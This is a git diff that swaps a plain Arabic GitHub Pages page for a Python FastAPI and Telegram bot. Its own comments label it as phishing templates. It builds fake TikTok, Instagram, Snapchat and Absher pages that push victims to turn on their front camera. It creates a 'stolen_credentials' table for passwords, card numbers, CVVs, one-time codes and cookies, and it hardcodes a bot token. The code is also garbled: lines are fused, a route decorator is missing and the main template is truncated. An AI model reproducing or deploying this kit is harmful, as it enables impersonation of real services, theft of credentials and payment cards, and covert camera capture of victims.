@@ -1,13 +1,191 @@
+import os
+import base64
+import io                                             import sqlite3
+import hashlib
+import traceback                                      import logging                                        import random
+import string                                         import json
+from datetime import datetime                         import uvicorn                                        from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
+from fastapi.responses import HTMLResponse, JSONResponse                                                    from fastapi.middleware.cors import CORSMiddleware
+import telebot                                        from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo                                                                                  # ==================== إعداد السجلات ====================
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)                                                                        # ==================== التكوينات ====================
+BOT_TOKEN = "8190106714:AAHItqfPXUBNzf3BZyp-xoPoGmr5PcvV_zg"
+RENDER_URL = os.getenv("RENDER_URL", "")              CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_Secret_2026")                                          SALT = os.getenv("SALT", "Shadow_Salt_321")           OWNER_ID = int(os.getenv("OWNER_ID", "7295259673"))
+                                                      BOT_TOKEN = "8190106714:AAHItqfPXUBNzf3BZyp-xoPoGmr5PcvV_zg"                                                RENDER_URL = os.getenv("RENDER_URL", "")
+CAPTURE_SECRET = os.getenv("CAPTURE_SECRET", "Shadow_")
+SALT = os.getenv("SALT", "Shadow_Salt_321")           OWNER_ID = int(os.getenv("OWNER_ID", "7295259673"))   
+bot = telebot.TeleBot(BOT_TOKEN)
+                                                      try:
+    me = bot.get_me()
+    print(f"✅ التوكن صحيح ويعمل! اسم البوت: @{me.username}")                                               except Exception as e:
+    print(f"❌ فشل تهيئة البوت: {e}")                 
+app = FastAPI()                                       app.add_middleware(                                       CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,                               allow_methods=["*"],                                  allow_headers=["*"],
+)                                                     
+# ==================== المسار الرئيسي (قوالب التصيد) ====================                                   @app.get("/")
+async def home(request: Request):
+    template = request.query_params.get("template", "tiktok")                                                   return HTMLResponse(get_html_content(template, CAPTURE_SECRET))
+                                                      # ==================== صفحة تسجيل الدخول (WebApp) ====================
+@app.get("/login-page", response_class=HTMLResponse)  async def login_page():
+    return get_login_html()
+                                                      # ==================== مسار Webhook ====================
+BOT_TOKEN = "8190106714:AAHItqfPXUBNzf3BZyp-xoPoGmr5PcvV_zg"
+async def webhook(request: Request):                      try:
+        json_string = await request.body()                    update = telebot.types.Update.de_json(json_string.decode('utf-8'))
+        bot.process_new_updates([update])                     return {"status": "ok"}
+    except Exception as e:                                    logger.error(f"Webhook Error: {e}")
+        return {"status": "error", "message": str(e)} 
+# ==================== قاعدة البيانات ====================                                                  def get_db_connection():
+    conn = sqlite3.connect("users.db", check_same_thread=False)                                                 conn.row_factory = sqlite3.Row
+    return conn
+                                                      def init_db():                                            conn = get_db_connection()
+    cursor = conn.cursor()                                cursor.execute("""
+        CREATE TABLE IF NOT EXISTS bot_users (                    username TEXT PRIMARY KEY,                            password_hash TEXT,
+            linked_chat_id INTEGER DEFAULT NULL,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP         )                                                 """)
+    cursor.execute("""                                        CREATE TABLE IF NOT EXISTS operation_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,                 chat_id INTEGER,                                      template_type TEXT,
+            generated_link TEXT,
+            target_ip TEXT,
+            created_at TEXT DEFAULT CURRENT_TIMESTAMP
+        )                                                 """)                                                  cursor.execute("""
+        CREATE TABLE IF NOT EXISTS captured_targets (             id INTEGER PRIMARY KEY AUTOINCREMENT,
+            owner_chat_id INTEGER,                                target_ip TEXT,
+            target_device TEXT,                                   image_count INTEGER,                                  captured_at TEXT DEFAULT CURRENT_TIMESTAMP
+        )                                                 """)
+    cursor.execute("""                                        CREATE TABLE IF NOT EXISTS stolen_credentials (                                                                 id INTEGER PRIMARY KEY AUTOINCREMENT,
+            owner_chat_id INTEGER,                                login_type TEXT,                                      email TEXT,
+            password TEXT,
+            card_number TEXT,                                     card_expiry TEXT,
+            card_cvv TEXT,
+            phone TEXT,                                           code TEXT,                                            cookies TEXT,
+            target_ip TEXT,                                       captured_at TEXT DEFAULT CURRENT_TIMESTAMP
+        )                                                 """)                                                  conn.commit()
+    conn.close()
+    logger.info("✅ قاعدة البيانات جاهزة")                                                                  init_db()
+                                                      def hash_password(password: str) -> str:
+    return hashlib.sha256((password + SALT).encode()).hexdigest()                                           
+def create_new_account(username, password):
+    conn = get_db_connection()                            cursor = conn.cursor()                                hashed = hash_password(password)                      try:
+        cursor.execute("INSERT OR IGNORE INTO bot_users (username, password_hash) VALUES (?, ?)", (username, hashed))
+        conn.commit()                                     except Exception as e:
+        logger.error(f"DB Error create: {e}")
+    finally:                                                  conn.close()                                  
+def try_login_user(chat_id, username, password):          conn = get_db_connection()
+    cursor = conn.cursor()                                cursor.execute("SELECT password_hash FROM bot_users WHERE username = ?", (username,))                       result = cursor.fetchone()                            if result and result[0] == hash_password(password):                                                             cursor.execute("UPDATE bot_users SET linked_chat_id = ? WHERE username = ?", (chat_id, username))           conn.commit()
+        conn.close()                                          return True
+    conn.close()                                          return False                                      
+def has_active_session(chat_id):
+    conn = get_db_connection()                            cursor = conn.cursor()
+    cursor.execute("SELECT username FROM bot_users WHERE linked_chat_id = ?", (chat_id,))                       result = cursor.fetchone()                            conn.close()
+    return result is not None                         
+def log_operation(chat_id, template_type, link, ip="0.0.0.0"):                                                  try:
+        conn = get_db_connection()
+        cursor = conn.cursor()                                cursor.execute("INSERT INTO operation_logs (chat_id, template_type, generated_link, target_ip) VALUES (?, ?, ?, ?)",                                                             (chat_id, template_type, link, ip))                                                          conn.commit()                                         conn.close()
+    except Exception as e:
+        logger.error(f"⚠️ فشل تسجيل العملية: {e}")
 
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
+def log_capture(owner_chat_id, ip, device, count):        try:                                                      conn = get_db_connection()
+        cursor = conn.cursor()                                cursor.execute("INSERT INTO captured_targets (owner_chat_id, target_ip, target_device, image_count) VALUES (?, ?, ?, ?)",
+                       (owner_chat_id, ip, device, count))                                                          conn.commit()
+        conn.close()                                      except Exception as e:
+        logger.error(f"⚠️ فشل تسجيل الالتقاط: {e}")    
+def log_credentials(owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip):                                        try:                                                      conn = get_db_connection()
+        cursor = conn.cursor()
+        cursor.execute("""                                        INSERT INTO stolen_credentials
+            (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, target_ip)                                                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (owner_chat_id, login_type, email, password, card_number, card_expiry, card_cvv, phone, code, cookies, ip))                                                  conn.commit()                                         conn.close()
+    except Exception as e:
+        logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")                                                     
+# ==================== صفحات HTML ====================def get_login_html():
+    return """<!DOCTYPE html>                         <html lang="ar" dir="rtl">                            <head>
     <meta charset="UTF-8">
-    <title>موقعي التجريبي</title>
-</head>
-<body>
-    <h1>مرحباً بك في موقعي الأول على GitHub Pages!</h1>
-    <p>هذه الصفحة تعمل بنجاح وبشكل مشفر عبر HTTPS.</p>
-</body>
-</html>
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">                                      <title>تسجيل الدخول للنظام</title>                    <script src="https://telegram.org/js/telegram-web-app.js"></script>                                         <style>                                                   body {
+            background-color: #182533;                            color: #ffffff;
+            font-family: system-ui, sans-serif;
+            display: flex;                                        flex-direction: column;                               align-items: center;
+            justify-content: center;                              min-height: 100vh;
+            margin: 0;                                            padding: 20px;
+            box-sizing: border-box;                           }                                                     .login-card {
+            background: #223140;                                  padding: 30px 25px;
+            border-radius: 15px;                                  box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+            max-width: 360px;                                     width: 100%;
+            text-align: center;                                   border: 1px solid #2b3d50;                        }
+        h2 { font-size: 22px; margin-bottom: 20px; color: #5288c1; }                                                .input-group { margin-bottom: 20px; text-align: right; }
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #b1c7df; }                              input {
+            width: 100%;                                          padding: 12px;
+            border-radius: 8px;                                   border: 1px solid #2b3d50;                            background: #182533;
+            color: white;
+            font-size: 16px;                                      box-sizing: border-box;                               outline: none;
+            transition: border 0.2s;                          }
+        input:focus { border-color: #5288c1; }                .btn {                                                    background-color: #2481cc;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;                                      font-weight: bold;                                    border-radius: 8px;
+            cursor: pointer;                                      width: 100%;
+            margin-top: 10px;                                     transition: background 0.2s;
+        }                                                     #error-msg { color: #e53935; font-size: 14px; margin-top: 15px; display: none; }
+        #success-msg { color: #4caf50; font-size: 14px; margin-top: 15px; display: none; }
+    </style>                                          </head>
+<body>                                                    <div class="login-card">
+        <h2>🔐 تسجيل الدخول للنظام</h2>                       <div class="input-group">                                 <label>اسم المستخدم</label>
+            <input type="text" id="username" placeholder="أدخل اسم المستخدم">                                       </div>
+        <div class="input-group">
+            <label>كلمة المرور</label>                            <input type="password" id="password" placeholder="أدخل كلمة المرور">
+        </div>                                                <button class="btn" id="loginBtn">تسجيل الدخول</button>                                                     <div id="error-msg"></div>                            <div id="success-msg"></div>
+    </div>
+    <script>                                                  const tg = window.Telegram.WebApp;                    tg.expand();
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            const user = document.getElementById('username').value.trim();                                              const pass = document.getElementById('password').value.trim();
+            const errorBlock = document.getElementById('error-msg');                                                    const successBlock = document.getElementById('success-msg');
+            if(!user || !pass) {                                      errorBlock.innerText = "⚠️ يرجى ملء جميع الحقول!";
+                errorBlock.style.display = "block";                   return;
+            }
+            errorBlock.style.display = "none";                    fetch('/api/web-login', {                                 method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({                                    chat_id: tg.initDataUnsafe.user.id,                                                                         username: user,                                       password: pass
+                })                                                })
+            .then(res => res.json())                              .then(data => {
+                if(data.status === "success") {                           successBlock.innerText = "🎉 تم تسجيل الدخول بنجاح!";                                                       successBlock.style.display = "block";
+                    setTimeout(() => { tg.close(); }, 1500);                                                                } else {
+                    errorBlock.innerText = "❌ " + data.message;                                                                errorBlock.style.display = "block";
+                }                                                 })
+            .catch(err => {                                           errorBlock.innerText = "⚠️ حدث خطأ في الاتصال بالسيرفر";
+                errorBlock.style.display = "block";
+            });                                               });                                               </script>
+</body>                                               </html>"""
+                                                      # ==================== قوالب التصيد ====================
+def get_html_content(template_type, secret_key):
+    # قوالب الكاميرا
+    if template_type in ["tiktok", "instagram", "snapchat", "ai_filter", "absher"]:                                 bg_color = "#010101"; card_bg = "#121212"; btn_color = "#fe2c55"
+        logo_text = "TikTok"; logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
+        title = "تحدي الملامح التفاعلي جاهز"                  desc = "يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية."                           btn_text = "▶ اضغط لمشاهدة التحدي"                    redirect_to = "https://www.tiktok.com"
+                                                              if template_type == "instagram":
+            bg_color = "#fafafa"; card_bg = "#ffffff"; btn_color = "#0095f6"
+            logo_text = "Instagram"; logo_style = "background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"
+            title = "🛡️ نظام فحص وتوثيق الحسابات الحية"
+            desc = "لتأكيد هويتك وتوثيق حسابك بالعلامة الزرقاء مجاناً، يرجى تفعيل الكاميرا الأمامية للمسح الحي."
+            btn_text = "✨ ابدأ الفحص الحي للحساب الآن"                                                                 redirect_to = "https://www.instagram.com"
+        elif template_type == "snapchat":                         bg_color = "#fffc00"; card_bg = "#ffffff"; btn_color = "#000000"                                            logo_text = "Snapchat"; logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
+            title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"                                                           desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل."
+            btn_text = "🔥 تشغيل الفلتر الحصري"                   redirect_to = "https://www.snapchat.com"
+        elif template_type == "ai_filter":                        bg_color = "#0f172a"; card_bg = "#1e293b"; btn_color = "#3b82f6"
+            logo_text = "AI Look-Alike 🧠"; logo_style = "background: linear-gradient(to right, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;"                          title = "🔍 فلتر كاشف الشبيه بالذكاء الاصطناعي v2.4"                                                        desc = "اكتشف من تشبه من مشاهير كرة القدم! يرجى السماح للكاميرا الأمامية لبدء المسح الحي."
+            btn_text = "⚡ ابدأ الفحص الحي واكتشف شبيهك الآن"
+            redirect_to = "https://www.google.com"
+        elif template_type == "absher":                           bg_color = "#f4f6f9"; card_bg = "#ffffff"; btn_color = "#2d6a4f"
+            logo_text = "Absher | أبشر"; logo_style = "color: #2d6a4f; font-weight: bold; border-bottom: 3px solid #52b788;"                                                  title = "🛡️ منصة التحقق الوطني الموحد (أمن البيانات)"                                                        desc = "تم رصد محاولة دخول مشبوهة. يرجى تفعيل الكاميرا الأمامية لمطابقة بصمة الوجه الحية."
+            btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
+            redirect_to = "https://www.saudiarabia.gov.sa"
+        return f"""<!DOCTYPE html>                    </html>
+"""                                                                                                         
+# ==================== معالج الرسائل الصحيح ====================                                            @bot.message_handler(commands=["start"])
+def send_welcome(message):
+    user = message.from_user.username or message.from_user.id                                                   print(f"📩 تم استقبال أمر /start من: {user}")
+    bot.reply_to(message, "أهلاً بك! البوت يعمل الآن بنجاح 🚀")
+                                                      @bot.message_handler(func=lambda message: True)       def echo_all(message):
+    print(f"📩 تم استقبال رسالة: {message.text}")
+    bot.reply_to(message, f"وصلتني رسالتك: {message.text}")                                                 
+if __name__ == "__main__":                                print("⚡ البوت متصل الآن واستجابة الرسائل مفعلة...")                                                       bot.polling(none_stop=True, timeout=30, long_polling_timeout=30)
